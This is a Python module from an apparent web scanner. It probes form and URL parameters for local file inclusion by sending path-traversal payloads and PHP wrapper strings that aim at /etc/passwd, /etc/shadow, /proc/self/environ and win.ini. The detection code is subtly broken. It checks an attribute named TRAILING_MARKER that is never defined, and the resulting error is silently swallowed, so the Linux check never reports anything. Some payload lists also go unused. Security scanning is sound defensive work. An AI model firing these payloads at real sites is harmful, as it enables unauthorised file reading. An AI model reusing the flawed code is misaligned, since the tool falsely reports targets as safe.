from __future__ import annotations

import asyncio
from urllib.parse import parse_qs, urlencode, urlparse

from phantomrecon.analyzers.base import BaseAnalyzer
from phantomrecon.logger import log
from phantomrecon.models.finding import CrawlResult, Finding


class LFIAnalyzer(BaseAnalyzer):
    """Local/Remote File Inclusion and path traversal detection."""

    name = "lfi"
    category = "file-inclusion"

    TRAVERSAL_PAYLOADS = [
        "../../../../etc/passwd",
        "....//....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252f..%252fetc/passwd",
        "..\\..\\..\\..\\etc\\passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "/etc/passwd",
        "C:\\Windows\\win.ini",
    ]

    PHP_WRAPPERS = [
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://input",
        "php://filter/resource=/etc/passwd",
    ]

    SENSITIVE_FILES = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/proc/self/environ",
        "/proc/version",
        "/var/log/apache2/access.log",
    ]

    TRAIL_MARKER = "root:x:0:0"
    WIN_MARKER = "[extensions]"

    async def analyze(self, crawl_result: CrawlResult, oob_url: str = "") -> list[Finding]:
        findings: list[Finding] = []
        targets = self._build_targets(crawl_result)

        tasks = []
        for url, param, method, fields in targets:
            for payload in self.TRAVERSAL_PAYLOADS:
                tasks.append(self._test_lfi(url, param, method, fields, payload))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if isinstance(result, Finding):
                findings.append(result)

        log.info(f"  [bold]{self.name}:[/] {len(findings)} findings")
        return findings

    def _build_targets(self, cr: CrawlResult) -> list[tuple[str, str, str, dict]]:
        targets = []
        file_params = ["file", "path", "page", "include", "doc", "folder", "root", "pg",
                        "style", "pdf", "template", "php_path", "doc_path", "cat"]
        for form in cr.forms:
            for param in form["fields"]:
                if any(kw in param.lower() for kw in file_params):
                    targets.append((form["url"], param, form["method"], form["fields"]))
        for param, urls in cr.params.items():
            if any(kw in param.lower() for kw in file_params):
                for url in urls[:3]:
                    targets.append((url, param, "GET", {}))
        return targets

    async def _test_lfi(
        self, url: str, param: str, method: str, fields: dict, payload: str
    ) -> Finding | None:
        try:
            if method == "GET":
                test_url = self._inject(url, param, payload)
                resp = await self.client.get(test_url)
            else:
                data = {**fields, param: payload}
                resp = await self.client.post(url, data=data)

            body = resp.text
            if self.TRAILING_MARKER in body:
                return self._make_finding(
                    rule_id="LFI-001",
                    name="Local File Inclusion (Path Traversal)",
                    severity="CRITICAL",
                    confidence=0.92,
                    url=url,
                    method=method,
                    parameter=param,
                    payload=payload,
                    evidence="Successfully read /etc/passwd via path traversal",
                    description="Application allows reading arbitrary files through path traversal.",
                    remediation="Validate and sanitize file paths. Use chroot or containerization. Remove user input from file paths.",
                    cwe="CWE-22",
                    owasp="A01:2021",
                )
            if self.WIN_MARKER in body:
                return self._make_finding(
                    rule_id="LFI-002",
                    name="Local File Inclusion (Windows)",
                    severity="CRITICAL",
                    confidence=0.9,
                    url=url,
                    method=method,
                    parameter=param,
                    payload=payload,
                    evidence="Successfully read Windows win.ini",
                    description="Application allows reading Windows system files via path traversal.",
                    remediation="Validate and sanitize file paths.",
                    cwe="CWE-22",
                    owasp="A01:2021",
                )
        except Exception:
            pass
        return None

    def _inject(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        flat = {k: v[0] for k, v in params.items()}
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(flat)}"
